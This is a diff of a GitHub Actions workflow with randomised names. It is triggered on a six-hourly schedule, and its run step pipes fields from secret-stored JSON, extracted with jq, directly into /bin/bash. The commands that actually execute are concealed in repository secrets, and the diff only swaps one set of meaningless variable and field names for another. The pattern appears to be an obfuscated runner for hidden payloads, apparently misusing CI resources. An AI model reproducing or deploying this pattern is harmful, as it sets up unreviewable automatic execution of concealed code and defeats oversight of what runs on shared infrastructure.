@@ -1,29 +1,34 @@
 name: xuntianzong2387
+
 on:
   workflow_dispatch:
   schedule:
     - cron: '27 5/6 * * *'
 
-jobs:  # 2978
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xuntianzong2387
         env:
-          kbl2: ${{ secrets.kbl2 }}
+          onoj4: ${{ secrets.onoj4 }}
         run: |
-          echo $kbl2 | jq -r .nmzh9 | /bin/bash
-          echo $sgo96943 | jq -r .nos190 | /bin/bash
-          echo $qn12 | jq -r .bmle19 | /bin/bash
-          echo $wcf777 | jq -r .g7020 | /bin/bash
-          echo $h5 | jq -r .pk038 | /bin/bash
-          echo $nprur1 | jq -r .nmqzo22 | /bin/bash
-          echo $d07 | jq -r .cft93 | /bin/bash
-          echo $slq3990 | jq -r .d4715 | /bin/bash
-          echo $exey15710 | jq -r .asfgl200 | /bin/bash
-          echo $p7 | jq -r .our0596 | /bin/bash
-          echo $hb5484 | jq -r .yjt0 | /bin/bash
-          echo $cqpew674 | jq -r .e758 | /bin/bash
-          echo $h48805 | jq -r .udd47 | /bin/bash
+          echo $onoj4 | jq -r .bsou0 | /bin/bash
+          echo $r62112 | jq -r .ijbrw1650 | /bin/bash
+          echo $rb806 | jq -r .zgnhj09977 | /bin/bash
+          echo $azymy0693 | jq -r .fdia52765 | /bin/bash
+          echo $nyz1020 | jq -r .rbd5875 | /bin/bash
+          echo $guzw9114 | jq -r .sgyt87934 | /bin/bash
+          echo $l99233 | jq -r .obmiz64605 | /bin/bash
+          echo $x99889 | jq -r .ruxoh68532 | /bin/bash
+          echo $ecpsu92 | jq -r .wn01241 | /bin/bash
+          echo $swbt1677 | jq -r .bw9 | /bin/bash
+          echo $q202 | jq -r .gwixk916 | /bin/bash
+          echo $tghtn850 | jq -r .wu7 | /bin/bash
+          echo $yksku7402 | jq -r .kn3 | /bin/bash
+          echo $q7116 | jq -r .c75 | /bin/bash
+          echo $jzrg62328 | jq -r .e2 | /bin/bash
+          echo $l0970 | jq -r .ty00 | /bin/bash
+          echo $kfx6 | jq -r .odk29823 | /bin/bash
 
